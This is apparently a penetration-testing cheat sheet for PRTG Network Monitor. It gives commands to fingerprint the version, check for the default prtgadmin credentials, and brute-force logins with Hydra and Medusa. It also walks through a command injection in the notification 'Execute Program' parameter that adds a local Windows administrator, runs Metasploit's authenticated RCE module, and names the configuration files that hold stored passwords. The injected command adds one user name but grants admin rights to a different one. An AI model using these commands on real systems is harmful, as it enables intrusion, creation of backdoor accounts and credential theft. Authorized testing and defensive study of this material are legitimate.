### **Introduction**

PRTG Network Monitor is a comprehensive network monitoring tool that allows businesses to observe and manage their IT infrastructure. It provides real-time data on the health and performance of network devices, servers, and services, enabling IT administrators to detect outages, optimize performance, and ensure system reliability. PRTG supports a wide range of technologies and comes with flexible alerting, reporting capabilities, and an intuitive interface for easy operation.

### **Default Configuration and Credentials**

1.  Identify PRTG version  
    `curl -s http://[PRTG-DOMAIN]/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version`
2.  Check if the PRTG default administrator credentials (prtgadmin:prtgadmin) are in use by accessing the login page:  
    `http://[PRTG-DOMAIN]/index.htm`

### **Brute-Force PRTG Credentials**

1.  Brute-Forcing with Hydra:  
    `hydra -l admin -P /path/to/passwords.txt [PRTG-DOMAIN] http-post-form "/public/checklogin.htm:login=^USER^&password=^PASS^:Login failed"`
2.  Brute-Forcing with Medusa:  
    `medusa -h [PRTG-DOMAIN] -u admin -P /path/to/passwords.txt -M http -m DIR:/public/checklogin.htm -m POST:login=^USER^&password=^PASS^ -T 10`

### **Command Injection**

1.  Navigate to Notifications Configuration:  
    `Navigate to Setup > Account Settings > Notifications.`
2.  Add New Notification:  
    `Click the plus button on the right and select "Add new notification"`
3.  Configure Notification:  
    `Leave everything unchanged, scroll down to the bottom and select “Execute Program”.`
4.  Choose a demo PowerShell script (e.g., demo.ps1) as the program file.
5.  In the Parameter field, enter the following command:  
    `test.txt;net user hackfast p3nT3st! /add;net localgroup administrators anon /add`
6.  Save the notification.
7.  In the list of notifications, check the box next to the new notification.
8.  Click the bell icon at the top to test the notification.

### **Remote Code Execution (RCE)**

1.  Start Metasploit:  
    `msfconsole`
2.  Search for PRTG-Related Exploits:  
    `searchsploit PRTG`
3.  Use exploit module:  
    `use exploit/windows/http/prtg_authenticated_rce`
4.  Set the Target Host:  
    `set RHOSTS [PRTG-URL]`
5.  Set the Username:  
    `set ADMIN_USERNAME admin`
6.  Set the Password:  
    `set ADMIN_PASSWORD prtgadmin`
7.  Run exploit:  
    `exploit`

**Extract Configuration and Data**:

1.  Locate configuration files to extract credentials and settings:  
    `\ProgramData\Paessler\PRTG Network Monitor`  
    `PRTG Configuration.dat`  
    `PRTG Configuration.old.bak`
2.  Encrypted password block format:
    
    ```
    <dbpassword>
        <flags>
            <encrypted/>
        </flags>
    </dbpassword>
    ```